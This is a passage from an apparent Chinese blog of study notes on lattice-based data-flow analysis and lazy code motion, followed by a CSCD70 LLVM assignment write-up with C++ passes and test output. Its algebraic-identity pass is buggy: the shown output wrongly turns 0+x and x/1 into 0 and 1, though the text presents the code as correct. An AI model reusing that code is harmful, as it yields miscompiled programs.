src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132214056.png"></p><p>关于数据流算法的理解,我认为为除entry以外的Basic Block赋初值是无意义的,只是为了便于算法的表示和实现,所以赋予的初值应该对结果无影响.</p><p>比如ForwardAnalysis中,一个基本块的前驱在分析该基本块时还没有分析过(循环),为了分析该块,应该引入一个对结果无影响的Out,即Top(原因后续解释).</p><h2 id="Foudation"><a href="#Foudation" class="headerlink" title="Foudation"></a>Foudation</h2><h3 id="Iterative-Algorithm-Another-View"><a href="#Iterative-Algorithm-Another-View" class="headerlink" title="Iterative Algorithm, Another View"></a>Iterative Algorithm, Another View</h3><p>给定有K个结点的CFG,每次迭代中每个结点产生一个OUT值,一次迭代中所有结点的OUT值的集合定义为k-tuple.每次迭代是对k-tuple执行TransferFunc,如果两次迭代输出的k-tuple相同,算法停止.</p><h3 id="Partial-Order-偏序"><a href="#Partial-Order-偏序" class="headerlink" title="Partial Order 偏序"></a>Partial Order 偏序</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537373.png"></p><h3 id="poset-偏序集"><a href="#poset-偏序集" class="headerlink" title="poset 偏序集"></a>poset 偏序集</h3><p>pair(一个集合P,一种在P上的偏序关系),称作偏序集.<br>偏序关系: 自反性,反对称性,传递性<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131744430.png"></p><p>偏序关系与全序关系的区别在于，全序关系可以让任意两个元素比较，而偏序关系不保证所有元素都能进行比较.比如偏序关系为substring, si substring sing, ng substring sing, 但si和ng不能进行比较(注意 <code>比较</code> 和<code>判断比较是否为真</code>的区别).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131747871.png"></p><h3 id="Upper-and-Lower-Bounds-上下界"><a href="#Upper-and-Lower-Bounds-上下界" class="headerlink" title="Upper and Lower Bounds 上下界"></a>Upper and Lower Bounds 上下界</h3><p>上下界是相对于子集S来说的.如果取子集S == P,该上下界为偏序集的上下界.<br>并不是每个偏序集都有 lub 和 glb，但是如果有，那么该 lub, glb 将是唯一的<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131754877.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131757973.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131756466.png"></p><h3 id="Lattice-格"><a href="#Lattice-格" class="headerlink" title="Lattice 格"></a>Lattice 格</h3><p>给定一个偏序集，如果任意两个元素 a, b 都有 lub和glb，那么这么偏序集就叫做 格（lattice).只存在其中一个就是半格.<br>全格: 任意一个集合,都有lub和glb.<br>在全格中,一定有一个最大元素Top,最小元素Bottom.注意这里的大小不是直观上的,而是偏序关系的一种形象化表述. 南京大学的软件分析课程在Top和Bottom的定义上似乎与CSCD70有冲突,目前我个人倾向于认为Top和Bottom由偏序关系决定,偏序关系由Meet操作体现,南京大学的课程将Union操作认为是Join,而CSCD70认为Union也是Meet的一种,而Meet和Join分别表示最大下界和最小上界,所以这样的差异导致了两种观点中may analysis在lattice上的移动方向不同.但哪一种是正确的还有待进一步了解,如若有师傅愿意指点一下,感恩!</p><p>下图来自CSCD70.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312140146469.png"></p><p>有穷的格一定是全格,全格不一定有穷(0,1之间所有实数的小于等于关系).</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132101820.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132101169.png"></p><h3 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis Framework via Lattice</h3><p>数据流分析框架(D,L,F)<br>    D:direction for data flow<br>    L: Lattice -&gt; pair(domain of values V ,meet or join).<br>    F: a family of transfer function.<br>数据流分析: 在 lattice 的值上迭代地应用转移方程和 meet/join 操作符.</p><h3 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h3><p>基本概念<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132127143.png"></p><p>这张图里单调性的第二种表示看着有点抽象,解释一下,相当于: f(z) ≤ min( f(x),f(y) ),其中z ≤ min(x,y).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537491.png"></p><p>不动点存在性证明:<br>(其实感觉只是用到了半格的性质,如果用全格的性质加单调性可以直接推F(TOP)=TOP ?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132140205.png"></p><p>最小不动点证明.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132157490.png"></p><h3 id="Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-Iterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate Iterative Algorithm to Fixed Point Theorem"></a>Relate Iterative Algorithm to Fixed Point Theorem</h3><p>待理解:<br>    每一个结点的OUT的值域是一个Lattice,数据流分析的Lattice是所有上述Lattice的Product.由于一个结点的OUT值域是finite的(Lattice是一个集合,finite指集合的元素有限),所以Product Lattice也是finite的.<br>    至于单调函数,应该从宏观上理解,包含transfer function和join/meet function,输入是上一次迭代的Product Lattice,产生一个新的Product Lattice.(下图的左上方)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132320990.png"></p><p>Transfer function是单调的,因为其的kill集和gen集仅与指令本身有关而与Input无关,单调方向与Input变化相同.Input变化由join/meet function决定.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132319576.png"></p><h3 id="When-Will-The-Algorithm-The-Fixed-Point"><a href="#When-Will-The-Algorithm-The-Fixed-Point" class="headerlink" title="When Will The Algorithm The Fixed Point?"></a>When Will The Algorithm The Fixed Point?</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537103.png"></p><p>最坏情况h*k是假设每次迭代只使得一个结点的OUT下降或上升一个高度,但其实不是很理解这种情况如何产生,如何在一次迭代中仅影响到一个结点的OUT?OUT改变意为IN改变,而IN不就是另一个结点的OUT么?<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312140058700.png"></p><h3 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View"></a>May/Must Analysis, A Lattice View</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141124723.png"></p><h3 id="MOP"><a href="#MOP" class="headerlink" title="MOP"></a>MOP</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141137764.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141137223.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537363.png"></p><h2 id="常量传播-稀疏条件常量传播"><a href="#常量传播-稀疏条件常量传播" class="headerlink" title="常量传播,稀疏条件常量传播"></a>常量传播,稀疏条件常量传播</h2><p>单个变量可能值域的Lattice设计为这个样子(回想一下,之前使用的Bool的值域其实也是一个Lattice)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141242129.png"></p><p>Transferfunc像这样.有一点需要注意,之前所说的数据流分析中TranferFunc的单调性依赖于其gen集,kill集与输入无关这一性质,所以OUT与IN成正相关(相对于偏序关系来说).但这里的TransferFunc的gen集明显受到IN的影响,不过分析一下可以发现gen集同样与IN正相关,所以最终的OUT还是正相关的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><h2 id="Lazy-Code-Motion"><a href="#Lazy-Code-Motion" class="headerlink" title="Lazy Code Motion"></a>Lazy Code Motion</h2><p>这个就比较复杂了.先放方法和定义,下面再解释.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161140450.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161141160.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161141424.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161142551.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161142526.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143657.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143147.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143526.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143009.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143697.png"></p><p>目标 :<br>    所有不复制代码就可消除的冗余计算都被消除<br>    优化后的代码不会执行源程序中不执行的任何计算<br>    表达式的计算应该尽量靠后, 利于寄存器分配</p><p>第一步计算预期执行表达式(绿色部分代表可预期执行),根据可预期执行的定义,在这些点放置表达式<code>不会执行源程序中不执行的任何计算</code>,且计算结果正确. 这是放置的正确性.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161156316.png"></p><p>第二步计算(将要)可用表达式,是假设在刚刚预期执行表达式分析结果为True的所有点放置对该的表达式计算后,再进行字面意义上的可用表达式分析(金色部分代表可用).</p><p>此时预期执行表达式-可用表达式得到的便是最有效的放置点.在被预期执行但不可用的所有点放置该表达式的计算,最小化了放置的数量,且使得刚刚通过假设所有预期执行点放置计算之后的可用表达式的分析结果成立. 这是放置的有效性. 最有效的放置点集合为Earliest.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161215797.png"></p><p>其实到这里已经完成了从部分冗余表达式到完全冗余表达式的转换,可以完成消除,但还不够完美.因为在Earliest的点放置表达式的计算,意味着表达式的生命周期最长,需要占据寄存器的时间就越长,所以接下来应该尽可能将放置推迟.</p><p>最多能推迟到什么地方呢?答案很明显,推迟到表达式的值被使用之前.(黑色部分代表可后延)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161231989.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161229468.png"></p><p>最后求Latest集合的公式: 前半部分是可放置的点,后半部分是边界条件,And之后得到最晚的可放置的点.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161255730.png"><br>(也许第一幅图里的Postponable少了给.inB<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161252370.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161300387.png"></p><p>最终结果:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161305583.png"></p><p>涉及到的数据流分析:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318935.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318683.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318742.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161319712.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161319787.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> 数据流分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70-Assignment1 Introduction to LLVM</title>
      <link href="/2023/CSCD70-Assignment1/"/>
      <url>/2023/CSCD70-Assignment1/</url>
      
        <content type="html"><![CDATA[<h1 id="函数信息"><a href="#函数信息" class="headerlink" title="函数信息"></a>函数信息</h1><span id="more"></span><p>没啥好说的.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FunctionInfoPass</span> <span class="keyword">final</span> : <span class="keyword">public</span> PassInfoMixin&lt;FunctionInfoPass&gt; {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">PreservedAnalyses <span class="title">run</span><span class="params">([[maybe_unused]] Module &amp;M, ModuleAnalysisManager &amp;)</span> </span>{</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">"CSCD70 Function Information Pass"</span></span><br><span class="line">           &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; F : M.<span class="built_in">functions</span>())</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Function Name: "</span> &lt;&lt; F.<span class="built_in">getName</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Arguments: "</span> &lt;&lt; F.<span class="built_in">arg_size</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Calls: "</span> &lt;&lt; F.<span class="built_in">getNumUses</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number OF BBs: "</span> &lt;&lt; F.<span class="built_in">size</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Instructions: "</span> &lt;&lt; F.<span class="built_in">getInstructionCount</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">  }</span><br><span class="line">}; <span class="comment">// class FunctionInfoPass</span></span><br></pre></td></tr></tbody></table></figure><h1 id="局部优化"><a href="#局部优化" class="headerlink" title="局部优化"></a>局部优化</h1><h2 id="代数恒等式"><a href="#代数恒等式" class="headerlink" title="代数恒等式"></a>代数恒等式</h2><h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><p>加减运算中,其中一个操作数为常量0;乘除运算中,其中一个操作数为常量1.</p><p>在判别常量的值的时候,需要这样的转化:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Value* oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>)</span><br><span class="line">ConstVal1 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>()</span><br></pre></td></tr></tbody></table></figure><p>但是在二元运算中,操作数不一定是ConstantInt,所以需要先判别一下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br></pre></td></tr></tbody></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>用代数恒等式的最终值代替所有引用该指令结果的地方,然后删除该指令.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In.<span class="built_in">replaceAllUsesWith</span>(AlgebraicIdentity);</span><br></pre></td></tr></tbody></table></figure><p>删除指令应该在遍历完所有指令之后,否则可能会导致迭代器失效.<br>一个相关的demo如下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">vec</span><span class="params">({<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>})</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(std::vector&lt;<span class="type">int</span>&gt;::iterator iter = vec.<span class="built_in">begin</span>();iter!=vec.<span class="built_in">end</span>();++iter)</span><br><span class="line">    {</span><br><span class="line">        std::cout &lt;&lt; *iter &lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        vec.<span class="built_in">erase</span>(iter);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp &amp;&amp; ./a.out</span><br><span class="line">22145664082593 0872 180082552 2 6101240994215 82538  19428801684252 4048 9411899120 87594 220361632 217 91908160516051605 88948 81625610688 288 288 288 211024042 80848 8242 242 242 242 0 80094 85240422961 961 961 961 87619 85558 23824 894 894 894 89286254005 213 959527952795279527221 52042352892352045204520452049 87673 54062283040 040 040 040 84094 84344 840972344 844 844 844 844 844 844 844 844 840972344 840972344 891303733 94279427942794279427942794279427942748211 876164408 540161074 540161016101610161074 540161074 540161074 </span><br><span class="line">......</span><br><span class="line">段错误</span><br></pre></td></tr></tbody></table></figure><p>将所有要删除的指令加入一个vector,最后统一删除.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delIns</span><span class="params">(std::vector&lt;Instruction*&gt; InsList)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; ins : InsList)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(ins-&gt;<span class="built_in">isSafeToRemove</span>())</span><br><span class="line">    {</span><br><span class="line">      ins-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注意这里使用的是eraseFromParent,使用removeFromParent会导致如下错误:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Instruction referencing instruction not embedded in a basic block!</span><br><span class="line">  %<span class="number">5</span> = sdiv i32 %<span class="number">3</span>, <span class="number">10</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// This method unlinks 'this' from the containing basic block, but does not</span></span><br><span class="line"><span class="comment">/// delete it.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">removeFromParent</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// This method unlinks 'this' from the containing basic block and deletes it.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \returns an iterator pointing to the element after the erased one</span></span><br><span class="line">SymbolTableList&lt;Instruction&gt;::<span class="function">iterator <span class="title">eraseFromParent</span><span class="params">()</span></span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PreservedAnalyses <span class="title">AlgebraicIdentityPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        Value* AlgebraicIdentity = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">auto</span> oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 =In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int64_t</span> ConstVal1,ConstVal2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br><span class="line">          ConstVal1 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2))</span><br><span class="line">          ConstVal2 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper2)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">          <span class="comment">//x+0 x-0 --&gt; x</span></span><br><span class="line">        <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">        <span class="keyword">case</span> Instruction::Sub:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;!ConstVal1)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;!ConstVal2))</span><br><span class="line">          {</span><br><span class="line">            AlgebraicIdentity = oper1 ? oper1 : oper2;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">        <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;ConstVal1==<span class="number">1</span>)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;ConstVal2==<span class="number">1</span>))</span><br><span class="line">          {</span><br><span class="line">            AlgebraicIdentity = ConstVal1==<span class="number">1</span>? oper2 : oper1;</span><br><span class="line">            flag = <span class="literal">true</span>; </span><br><span class="line">          }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        {</span><br><span class="line">          In.<span class="built_in">replaceAllUsesWith</span>(AlgebraicIdentity);</span><br><span class="line">          del_InsList.<span class="built_in">push_back</span>(&amp;In);</span><br><span class="line">          ++cnt;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @AlgebraicIdentity(i32 noundef %0) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Algebraic Identity: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity ./test/TestCase1.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><p>优化前:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @AlgebraicIdentity(i32 noundef %0) {</span><br><span class="line">  %2 = add nsw i32 %0, 0</span><br><span class="line">  %3 = add nsw i32 0, %0</span><br><span class="line">  %4 = mul nsw i32 %0, 1</span><br><span class="line">  %5 = mul nsw i32 1, %0</span><br><span class="line">  %6 = sub nsw i32 %0, 0</span><br><span class="line">  %7 = sdiv i32 %0, 1</span><br><span class="line">  %8 = call i32 (ptr, ...) @printf(ptr noundef @.str, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6, i32 noundef %7)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>优化后:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @AlgebraicIdentity(i32 noundef %0) {</span><br><span class="line">  %2 = call i32 (ptr, ...) @printf(ptr noundef @.str, i32 noundef %0, i32 noundef 0, i32 noundef %0, i32 noundef %0, i32 noundef %0, i32 noundef 1)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="强度削弱"><a href="#强度削弱" class="headerlink" title="强度削弱"></a>强度削弱</h2><h3 id="识别-1"><a href="#识别-1" class="headerlink" title="识别"></a>识别</h3><p>乘除运算,其中一个操作数为2的幂.</p><h3 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h3><p>在原指令下方增加一条移位指令,移除并删除原指令.这里要用到IRBuilder.<br>用当前指令来初始化builder,为其设置指令的插入点.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IRBuilder&lt;&gt; <span class="built_in">builder</span>(&amp;In);</span><br><span class="line">Value* NewIns = builder.<span class="built_in">CreateShl</span>(oper,shift);</span><br><span class="line">In.<span class="built_in">replaceAllUsesWith</span>(NewIns);</span><br></pre></td></tr></tbody></table></figure><h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 